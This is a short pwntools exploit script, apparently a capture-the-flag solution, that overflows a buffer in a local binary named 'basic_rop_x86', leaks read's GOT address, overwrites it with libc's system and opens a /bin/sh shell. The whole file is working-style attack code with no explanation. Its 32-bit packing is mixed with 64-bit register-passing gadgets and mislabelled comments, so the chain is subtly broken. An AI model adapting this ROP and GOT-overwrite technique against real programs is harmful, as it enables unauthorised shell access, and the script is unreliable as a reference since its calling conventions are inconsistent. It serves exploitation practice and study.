from pwn import *
context.log_level = 'debug'

p = process('./basic_rop_x86')
e = ELF('./basic_rop_x86')
r = ROP(e)
libc = ELF("./libc.so.6")

# gadget
pop_rdi = r.find_gadget(['pop edi'])[0]
pop_rsi_r15 = r.find_gadget(['pop esi'])[0]
ret = r.find_gadget(['ret'])[0]

# plt, got address
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']

payload = b"A" * 0x48

# write(1, read_got, ...)
payload += p32(pop_rdi) + p32(1)
payload += p32(pop_rsi_r15) + p32(read_got) + p32(0)
payload += p32(write_plt)

# read(0, read_got, ...) => GOT Overwrite
payload += p32(pop_rdi) + p32(0)
payload += p32(pop_rsi_r15) + p32(read_got) + p32(0)
payload += p32(read_plt)

# read("/bin/sh") => system("/bin/sh") 
payload += p32(pop_rdi) + p32(read_got + 0x4)
payload += p32(ret)
payload += p32(read_plt)

# read(0, buf, 0x400)
p.send(payload)

# write(1, buf, 0x40)
p.recvn(0x40)

# write(1, read_got, ...)
read = u32(p.recvn(4))
system = read - libc.symbols['read'] + libc.symbols['system']

# read(0, read_got, ...)
p.send(p32(system) + b"/bin/sh\x00")

p.interactive()
